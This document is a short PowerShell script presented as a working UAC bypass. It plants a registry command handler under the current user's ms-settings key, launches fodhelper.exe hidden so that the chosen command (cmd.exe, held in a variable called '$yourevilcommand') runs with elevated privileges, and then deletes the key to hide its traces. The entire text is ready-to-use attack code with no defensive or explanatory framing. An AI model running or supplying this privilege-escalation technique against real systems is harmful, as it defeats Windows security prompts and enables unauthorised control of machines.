#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe

$yourevilcommand = "C:\Windows\System32\cmd.exe"

#Adding all the reistry required with your command.

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force

#Starts the fodhelper process to execute your command.

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

#Cleaning up the mess created.
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
